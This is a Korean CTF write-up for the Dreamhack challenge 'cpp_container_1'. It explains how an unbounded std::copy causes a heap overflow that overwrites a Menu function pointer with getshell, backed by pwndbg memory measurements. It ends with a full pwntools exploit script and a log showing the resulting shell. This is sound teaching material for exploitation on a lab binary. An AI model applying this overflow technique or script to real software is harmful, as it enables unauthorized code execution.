# ✏️ cpp_container_1

> `std::copy`가 출력 범위의 끝을 받지 않는다 → `src.size()`만 키워 `dest` 버퍼를 선형으로 넘침 → 0x20 뒤에 붙어 있는 `Menu` 객체의 함수 포인터를 `getshell`로 교체.

## 📄 Vulnerability & Code Analysis

```
g++ -o cpp_container_1 cpp_container_1.cpp -no-pie
```

| 보호기법 | 값 | 이 경로에 미치는 영향 |
|---|---|---|
| PIE | **No PIE** (0x400000 고정) | `getshell` 주소 고정 → **leak 불필요** |
| RELRO | Partial | GOT를 쓰지 않음 → 무관 |
| NX | on | 기존 코드로 점프 → 무관 |
| Canary | found | **스택을 건드리지 않음 → 무관** |

`checksec`만 보면 "카나리 leak → ROP"로 읽히지만, 이 문제는 스택 버퍼를 아예 쓰지 않는다. `char buf[]`가 없고 입력은 전부 `std::cin >> int`로 받아 **힙에 있는 `vector`** 로 들어간다. 카나리는 지나갈 일이 없는 문 앞의 알람이다.

### 메뉴 구조

```cpp
class Menu{
public:
    void (*fp)(void) = print_menu;   // 멤버가 함수 포인터 하나뿐
};

void getshell(){ system("/bin/sh"); }

int main(){
    std::vector<int> src(3, 0);      // malloc(12) → 0x20 청크
    std::vector<int> dest(3, 0);     // malloc(12) → 0x20 청크
    Menu *menu = new Menu();         // operator new(8) → 0x20 청크
    while(1){
        menu->fp();                  // ← 매 루프마다 호출
        std::cin >> selector;
        // 1 make / 2 modify / 3 copy / 4 view / 5 exit
    }
}
```

### 취약점

입력 지점 중 **값이 아니라 크기를 받는 곳**이 하나 있다.

```cpp
void modify_container(std::vector<int> &src, std::vector<int> &dest){
    std::cin >> size;  src.resize(size);     // ← 내 숫자가 경계 역할을 하는 자리로
    std::cin >> size;  dest.resize(size);
}
```

`resize` 자체는 안전하다. `vector`는 숫자와 실제 버퍼를 **항상 같이** 갱신하므로 혼자서는 절대 넘치지 않는다. 다만 `src.size()`와 `dest.size()`를 **서로 다르게** 만들어 둘 수 있는 상태를 남긴다.

그 상태를 터뜨리는 코드가 메뉴 3번이다.

```cpp
void copy_container(std::vector<int> &src, std::vector<int> &dest){
    std::copy(src.begin(), src.end(), dest.begin());
}
```

인자를 세어보면 **출력 범위의 끝이 없다.** `std::copy`의 3-인자 버전은 입력 범위 `[first, last)`와 출력 **시작점**만 받고, 담을 자리가 있는지는 호출자가 보장하라는 계약이다. 그 보장 코드가 이 함수에도, 호출하는 `main`에도 없다.

> `memcpy(dst, src, src_len)` 과 논리적으로 동일한 버그다. 길이를 source가 정하고 destination의 용량을 확인하지 않는다.

### 능력

```
dest 버퍼의 시작점부터, 내가 정한 개수(src.size())만큼,
내가 정한 int 값을 연속해서 쓸 수 있다.
```

= **선형 힙 오버플로우.** 메뉴를 공격자 언어로 번역하면 이렇게 된다.

| 메뉴 | 역할 |
|---|---|
| 2. modify | **쓸 개수를 정한다** (`src.resize`) |
| 1. make | **쓸 값을 정한다** (`cin >> data`) |
| 3. copy | **방아쇠를 당긴다** |

## 🧩 Exploit / Solver Strategy

### 1. 타겟 — RIP는 어디서 오나

`main`은 `while(1)` 무한 루프라 **리턴할 일이 없다.** 리턴 주소 덮기는 길이 아니다.

CPU가 점프하는 순간은 `call`/`jmp`/`ret` 셋뿐이고, 그중 **점프 주소를 메모리에서 읽어오는** 것만 조작 가능하다. 후보는 셋이다.

| 후보 | 사는 곳 | 힙 쓰기로 닿나 |
|---|---|---|
| 리턴 주소 | 스택 | ✗ |
| GOT | 데이터 섹션 | ✗ |
| **함수 포인터** | **힙 포함 어디든** | **✓** |

능력이 힙에 한정되므로 앞의 둘은 **기법이 어려워서가 아니라 손이 닿지 않아서** 탈락한다. 남은 건 함수 포인터고, 루프 안에 정확히 그것이 있다.

```asm
0x40154c <main+167>:   mov  rax, QWORD PTR [rbp-0x58]   ; menu 포인터
0x401550 <main+171>:   mov  rax, QWORD PTR [rax]        ; [menu] = fp 값
0x401553 <main+174>:   call rax                         ; 점프
...
0x4015e2 <main+317>:   jmp  0x40154c <main+167>         ; 루프 top으로
```

`call rax` — 일반 호출(`call 0x401052 <make_container>`)과 달리 주소가 명령어에 박혀 있지 않다. **함수 포인터 호출의 모양**이고, `disass main` 전체에서 이것 하나뿐이다. 그리고 `+317`이 `+167`로 되돌아오므로 **매 루프마다 실행된다.**

세 조건이 모두 맞는다 — 함수 포인터다 / `new`로 **힙**에 있다 / **루프마다 호출된다.**

### 2. 측정 — 소스로 알 수 없는 숫자 하나

남은 미지수는 `dest` 버퍼에서 `menu->fp`까지의 거리뿐이다. 힙 주소는 런타임에 정해지므로 여기서 디버거를 켠다.

`fp`의 자리는 `+171` 실행 **직전**의 `rax`다. (`+171`이 실행되면 `rax`가 fp 값으로 덮인다.)

```
pwndbg> break *0x401550
pwndbg> r
RAX  0x617060 —▸ 0x400f83 (print_menu()) ◂— push rbp
```

출발점은 `copy_container`의 두 번째 인자(`rsi` = `&dest`)에서 읽는다.

```
pwndbg> break copy_container
pwndbg> c                     (메뉴에서 3)
RSI  0x7fffffffdbd0 —▸ 0x617040
     └─ 스택: dest 구조체 ─┘   └─ 힙: _begin ─┘
```

```
pwndbg> x/8gx 0x617040
0x617040:  0x0000000000000000  0x0000000000000000   ← dest 데이터 + 패딩
0x617050:  0x0000000000000000  0x0000000000000021   ← menu 청크 헤더
0x617060:  0x0000000000400f83  0x0000000000000000   ← menu->fp
```

`vector<int>&`는 참조라 `rsi`는 **스택의 구조체 주소**이고, 첫 멤버 `_begin`이 힙을 가리킨다. (`x/3gx $rsi` 하면 `_begin`, `_end`, `_cap_end` 셋이 보인다.)

세 청크가 전부 `0x20`인 이유는 요청 크기가 모두 24바이트 이하이기 때문이다. `malloc(12)`, `operator new(8)` 모두 x86-64 최소 청크 `0x20`으로 올림된다. 그래서 `src → dest → menu`가 **32바이트 간격으로** 나란히 깔린다.

```
pwndbg> p/d 0x617060 - 0x617040
$1 = 32
```

### 3. 인덱스 환산

`std::copy`는 `int`(4바이트) 단위로 쓴다.

```
dest[i] 의 주소 = 0x617040 + i*4
32 / 4 = 8                       →  menu->fp 는 dest[8]
```

그런데 `fp`는 **8바이트**, 칸은 **4바이트**다. 두 칸이 필요하다.

```
         ← fp 8바이트 →
       ┌─────────┬─────────┐
       │ dest[8] │ dest[9] │
       └─────────┴─────────┘
       0x617060  0x617064
```

`dest[9]`까지 쓰려면 `dest[0]`부터 10개 → **`src.size() = 10`**.

### 4. 제약

- **`dest`는 resize하지 않는다.** capacity가 3뿐이라 키우면 재할당이 일어나 `dest`가 `menu` 옆자리를 떠난다. `std::copy`는 어차피 `dest` 경계를 보지 않으므로 키울 이유도 없다.
- **`dest[4]`~`dest[7]`은 `menu` 청크의 헤더**(`prev_size=0`, `size=0x21`)다. 선형 쓰기가 반드시 통과하므로 `dest[6] = 0x21`로 원본을 복원해 둔다. `copy` 직후 바로 `menu->fp()`가 호출되어 사이에 malloc/free가 끼지 않으므로 뭉개도 대개 동작하지만, 복원해두면 확실하다.
- **리틀엔디안**: `0x401041`은 상위 4바이트가 0이라 `dest[8] = 0x401041`, `dest[9] = 0`.
- **입력 개수를 정확히 맞춘다.** `make_container`는 `begin()~end()`를 돌므로 쓰는 개수가 현재 size로 고정이다. 하나라도 더 보내면 그 숫자를 다음 `cin >> selector`가 먹어 메뉴가 꼬인다.
- **C++ 심볼은 맹글링된다.** `e.symbols["getshell"]`은 `KeyError`다. 실제 이름은 `_Z8getshellv`.
- **덮은 뒤 메뉴 프롬프트가 나오지 않는다.** `menu->fp`가 `print_menu`가 아니게 되므로, `sendlineafter("[*] select menu: ")`로 기다리면 영원히 블록된다. `copy()` 다음은 바로 `interactive()`.

### 5. 순서

```
modify(10, 3)   →  src 만 10으로. dest 는 그대로
make(payload, [0,0,0])
copy()          →  overflow. menu->fp = getshell
(다음 루프의 menu->fp() 호출)  →  system("/bin/sh")
```

## 🚀 Final Payload or Solver

```python
#!/usr/bin/env python3
# cpp_container_1 — heap overflow -> Menu::fp overwrite -> getshell
from pwn import *

p = process('./cpp_container_1')        # 원격: remote("host.dreamhack.games", PORT)
e = ELF('./cpp_container_1')
context.arch = 'amd64'

# C++ 심볼은 맹글링돼 있다: getshell() -> _Z8getshellv
GETSHELL = e.symbols["_Z8getshellv"]    # 0x401041, No PIE 라서 고정


class Container:
    MENU_END = b"[*] select menu: "

    def __init__(self, io):
        self.io = io
        self.size1 = 3
        self.size2 = 3

    def _menu(self, choice):
        self.io.sendlineafter(self.MENU_END, str(choice).encode())

    def _nums(self, values):
        if values:
            self.io.send(b"\n".join(str(v).encode() for v in values) + b"\n")

    def make(self, data1, data2):
        assert len(data1) == self.size1, f"data1 must be {self.size1} ints"
        assert len(data2) == self.size2, f"data2 must be {self.size2} ints"
        self._menu(1)
        self.io.recvuntil(b"Input container1 data"); self._nums(data1)
        self.io.recvuntil(b"Input container2 data"); self._nums(data2)

    def modify(self, size1, size2):
        self._menu(2)
        self.io.sendlineafter(b"Input container1 size", str(size1).encode())
        self.io.sendlineafter(b"Input container2 size", str(size2).encode())
        self.size1, self.size2 = size1, size2

    def copy(self):
        self._menu(3)
        self.io.recvuntil(b"copy complete!")

    def view(self):
        self._menu(4)
        out = []
        for tag in (b"container1 data: [", b"container2 data: ["):
            self.io.recvuntil(tag)
            body = self.io.recvuntil(b"]", drop=True)
            out.append([int(t) for t in body.split(b",") if t.strip()])
        return out


# 힙 레이아웃 (gdb 실측)
#   0x617020  src  버퍼      ┐
#   0x617040  dest 버퍼      ├─ 전부 0x20 청크 = int 8칸 간격
#   0x617060  menu->fp       ┘
#
#   dest[0..3]  dest 청크 안 (패딩)
#   dest[4..7]  menu 청크 헤더 (prev_size=0, size=0x21)
#   dest[8..9]  menu->fp      ← 타겟 (8바이트 = int 2칸)

SIZE = 10                               # dest[9] 까지 쓰려면 10개

payload = [0] * SIZE
payload[6] = 0x21                       # menu 청크 size 필드 복원 (0x20 | PREV_INUSE)
payload[8] = GETSHELL & 0xffffffff      # fp 하위 4바이트 = 0x401041
payload[9] = GETSHELL >> 32             # fp 상위 4바이트 = 0

c = Container(p)
c.modify(SIZE, 3)                       # dest 를 키우면 재할당돼서 menu 옆자리를 떠난다
c.make(payload, [0, 0, 0])              # dest 쪽 3개도 반드시 보내야 cin 이 안 꼬인다
c.copy()                                # 여기서 overflow -> menu->fp = getshell

log.success("menu->fp -> getshell(%#x)", GETSHELL)

# menu->fp 를 덮었으니 메뉴 프롬프트가 더 이상 출력되지 않는다.
p.interactive()
```

## 🏁 cat flag

로컬 실행 결과. 원격은 상단의 `process`를 문제 페이지에서 받은 `remote(HOST, PORT)`로 바꾸면 된다.

```bash
/home/kirin/.venv/pwn/bin/python3 cpp_container_1.py
```

```text
[+] Starting local process './cpp_container_1': pid 201741
[*] '.../cpp_container_1'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
[+] menu->fp -> getshell(0x401041)
[*] Switching to interactive mode
$ id
uid=1000(kirin) gid=1000(kirin) groups=1000(kirin),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),100(users),1001(docker)
```

---

## 정리

처음에 `checksec` 표만 보고 세운 계획은 "카나리 leak → ROP → GOT overwrite"였다. 셋 다 쓰지 않았다.

보호 기법 표는 **무엇이 취약한지 알려주지 않는다.** 경로를 정한 뒤에 "이 경로에 무엇이 걸리는지"를 읽는 참고표다. 순서를 뒤집으면 — 소스에서 버그를 찾고, 버그를 **능력 한 문장**으로 번역하고, 그 능력이 닿는 곳에서 타겟을 고르고, 마지막에 표를 읽으면 — 네 항목 중 셋이 무관하고 하나(No PIE)가 선물이라는 게 보인다.

그리고 이 문제의 본론은 결국 **"힙은 일렬로 깔린 메모리다"** 하나다. 기법 이름을 꺼낼 필요가 없었다. `0x20` 간격을 직접 세어본 게 전부다.
